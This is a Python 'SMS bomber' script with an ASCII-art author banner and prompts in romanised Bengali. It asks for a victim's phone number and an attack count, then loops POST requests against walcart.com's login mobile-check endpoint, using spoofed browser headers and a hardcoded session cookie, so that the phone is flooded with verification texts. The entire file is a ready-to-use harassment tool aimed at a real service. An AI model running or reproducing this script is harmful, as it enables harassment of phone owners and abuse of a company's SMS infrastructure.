import requests
from requests.structures import CaseInsensitiveDict

green = '\033[1;32m'
end = '\033[0m'
print (green+"""  _______ _    _ _  _____                                         
 |__   __| |  | (_)/ ____|                                        
    | |  | |__| |_| (___                                          
    | |  |  __  | |\___ \                                         
    | |  | |  | | |____) |                                        
   _|_|_ |_|  |_|_|_____/____   __  __                            
  / ____|      / ____|__   __| |  \/  |                           
 | (___  _   _| (___    | | ___| \  / |                           
  \___ \| | | |\___ \   | |/ _ \ |\/| |                           
  ____) | |_| |____) |  | |  __/ |  | |                           
 |_____/ \__, |_____/___|_|\___|_|  |_|                           
  / ____| __/ |     |__   __|                                     
 | |     |___/___  __ _| | ___  _ __                              
 | |    | '__/ _ \/ _` | |/ _ \| '__|                             
 | |____| | |  __/ (_| | | (_) | |                                
  \_____|_|  \___|\__,_|_|\___/|_|                                
 |  _ \                                                           
 | |_) |_   _                                                     
 |  _ <| | | |                                                    
 | |_) | |_| |                                                    
 |____/ \__, |                                                    
         __/ |                                                    
   __  _|___/ _____         _____ _    _       _  ___ ____   __   
  / / | |  | |  __ \       / ____| |  | |     | |/ (_)  _ \  \ \  
 | |  | |__| | |  | |_____| (___ | |__| | __ _| ' / _| |_) |  | | 
 | |  |  __  | |  | |______\___ \|  __  |/ _` |  < | |  _ <   | | 
 | |  | |  | | |__| |      ____) | |  | | (_| | . \| | |_) |  | | 
 | |  |_|  |_|_____/      |_____/|_|  |_|\__,_|_|\_\_|____/   | | 
  \_\                                                        /_/  
                                                                  """+end)

# CVALUE
blue = '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan = "\033[96m"
end = '\033[0m'
print ("\033[32m")

print ("	 -!-!- WeLcOmE-!-!- ( HD-SHaKiiB ) ( GhOsToFKiinG ) ")


print ("""
          
                       
   ╔═════════════════════════════════╗
   ║ AuTHor   : SHaKiiB ツ           ║
   ║ FaCeBooK : iTzSHaKiiB           ║
   ║ GitHuB   : iTzSHaKiB            ║
   ╚═════════════════════════════════╝
       
 
  
  
""")

number  = str(input("[>] Heii Mr : SHaKiiB Sir. apNar aTTack NumBer DiN: "))

amount = int(input("[>] Sir apNar aTTack ar PoriMaN LikHuN: "))


url2 = "https://www.walcart.com/easylogin/account/mobilecheck/"

headers2 = CaseInsensitiveDict()
headers2["authority"] = "www.walcart.com"
headers2["accept"] = "application/json, text/javascript, */*; q=0.01"
headers2["x-requested-with"] = "XMLHttpRequest"
headers2["user-agent"] = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36"
headers2["content-type"] = "application/x-www-form-urlencoded; charset=UTF-8"
headers2["sec-gpc"] = "1"
headers2["origin"] = "https://www.walcart.com"
headers2["sec-fetch-site"] = "same-origin"
headers2["sec-fetch-mode"] = "cors"
headers2["sec-fetch-dest"] = "empty"
headers2["referer"] = "https://www.walcart.com/customer/account/login/referer/aHR0cHM6Ly93d3cud2FsY2FydC5jb20v/"
headers2["accept-language"] = "en-US,en;q=0.9"
headers2["cookie"] = "PHPSESSID=ibu9t4doldh1i6cpae7u7o732s; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; form_key=FyNmrh1hkupATEp2; mage-cache-sessid=true; form_key=FyNmrh1hkupATEp2; ajaxsearch=%7B%7D; mage-messages=; section_data_ids=%7B%22customer%22%3A1641216975%2C%22cart%22%3A1641216975%2C%22wishlist%22%3A1641216980%7D; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D"

data2 = "mobile="+number+"&is_login=true&forgetpass=false"


for i in range(amount):
	try:
		
		resp2 = requests.post(url2, headers=headers2, data=data2)
		
		print(str (i+1)+" aTTack SenT \n")
		
	except:
		print ("TuMar PHonE a NeT Nai....pHonE neTwOrk a RakHo...")

